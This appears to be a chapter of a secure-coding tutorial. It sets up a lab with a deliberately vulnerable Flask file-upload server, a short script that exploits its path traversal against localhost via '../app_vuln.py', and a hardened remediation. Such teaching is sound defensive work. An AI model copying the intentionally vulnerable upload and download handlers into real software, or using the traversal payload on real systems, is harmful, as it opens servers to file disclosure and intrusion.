---
title: "Chapter 6: Hands-On Lab"
description: "In this self-contained lab, we will spin up a vulnerable Python/Flask server, exploit it, and then apply secure coding principles to fix it."
keywords: ["AppSec", "Cybersecurity", "Security Guide", "Tutorial", "01 Foundational", "Secure Coding", "06 Hands On Lab.Md"]
---

# Chapter 6: Hands-On Lab

## Vulnerable File Upload + Path Traversal Exploit
In this self-contained lab, we will spin up a vulnerable Python/Flask server, exploit it, and then apply secure coding principles to fix it.

### Prerequisites
- Python 3
- Flask (`pip install Flask Werkzeug`)

### The Vulnerable Application (`app_vuln.py`)
```python
from flask import Flask, request, send_file
import os

app = Flask(__name__)
UPLOAD_DIR = "uploads"
os.makedirs(UPLOAD_DIR, exist_ok=True)

@app.route('/upload', methods=['POST'])
def upload():
    file = request.files['file']
    # VULNERABILITY 1: Trusting the user's filename entirely
    filepath = os.path.join(UPLOAD_DIR, file.filename)
    file.save(filepath)
    return "File uploaded successfully."

@app.route('/download', methods=['GET'])
def download():
    filename = request.args.get('file')
    # VULNERABILITY 2: Path traversal allowed
    filepath = os.path.join(UPLOAD_DIR, filename)
    return send_file(filepath)

if __name__ == '__main__':
    app.run(port=5000)
```

### The Exploit Script (`exploit.py`)
```python
import requests

# 1. Upload a malicious file
files = {'file': ('shell.py', 'print("PWNED")')}
requests.post('http://localhost:5000/upload', files=files)

# 2. Exploit path traversal to read source code
# Payload: ../app_vuln.py
res = requests.get('http://localhost:5000/download?file=../app_vuln.py')
print("EXPLOIT RESULT:\n", res.text)
```

### The Secure Hardened Remediation (`app_secure.py`)
```python
from flask import Flask, request, send_file, abort
import os
import uuid
from werkzeug.utils import secure_filename

app = Flask(__name__)
UPLOAD_DIR = os.path.abspath("uploads")
os.makedirs(UPLOAD_DIR, exist_ok=True)
ALLOWED_EXTENSIONS = {'txt', 'png', 'jpg'}

def allowed_file(filename):
    return '.' in filename and filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS

@app.route('/upload', methods=['POST'])
def upload():
    file = request.files.get('file')
    if not file or not allowed_file(file.filename):
        return abort(400, "Invalid file type.")
    
    # REMEDIATION 1: Generate a random UUID filename, ignore user input
    ext = file.filename.rsplit('.', 1)[1].lower()
    safe_name = f"{uuid.uuid4()}.{ext}"
    filepath = os.path.join(UPLOAD_DIR, safe_name)
    
    file.save(filepath)
    return f"File uploaded as {safe_name}."

@app.route('/download', methods=['GET'])
def download():
    filename = request.args.get('file')
    
    # REMEDIATION 2: Ensure path resolution doesn't escape directory
    if not filename or '/' in filename or '\\' in filename:
        return abort(400, "Invalid filename.")
        
    filepath = os.path.abspath(os.path.join(UPLOAD_DIR, filename))
    
    # Critical check: Ensure the resolved path starts with the UPLOAD_DIR
    if not filepath.startswith(UPLOAD_DIR):
        return abort(403, "Path traversal attempt detected.")
        
    if not os.path.exists(filepath):
        return abort(404, "File not found.")
        
    return send_file(filepath)

if __name__ == '__main__':
    app.run(port=5000)
```
